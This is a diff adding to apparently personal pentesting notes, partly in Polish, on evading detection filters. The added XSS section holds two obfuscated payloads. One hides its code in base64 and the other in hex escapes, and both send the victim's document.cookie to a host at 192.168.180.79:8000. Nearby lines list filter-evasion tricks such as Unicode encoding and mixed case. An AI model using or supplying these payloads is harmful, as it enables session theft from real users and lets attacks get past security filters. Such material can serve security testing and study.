@@ -19,3 +19,10 @@ Unicode-encoding: % => \u0025
 Case Sensitivity (using mixed-cases to avoid detection)  
 Obfuscation using White Space and Delimiters  
 Zastępujemy każdy pojedynczy string w naszym ładunku jego szesnastkowym odpowiednikiem. Nawiasy, słowo self i wywołania () zostawiamy w spokoju, bo to one tworzą strukturę gramatyczną, która mówi serwerowi: "hej, wykonaj ten kod".
+
+# XSS
+```
+<img src=x onerror=eval(atob('d2luZG93LmxvY2F0aW9uPSdodHRwOi8vMTkyLjE2OC4xODAuNzk6ODAwMC8/Yz0nK2RvY3VtZW50LmNvb2tpZQ=='))>
+```
+atob usage dekoder kurwa
+<iframe src=ja&#x0D;vascript&colon;\u0073etTimeout('\x66\x65\x74\x63\x68\x28\x27\x68\x74\x74\x70\x3a\x2f\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x38\x30\x2e\x37\x39\x3a\x38\x30\x30\x30\x2f\x3f\x63\x3d\x27\x2b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29')></iframe>
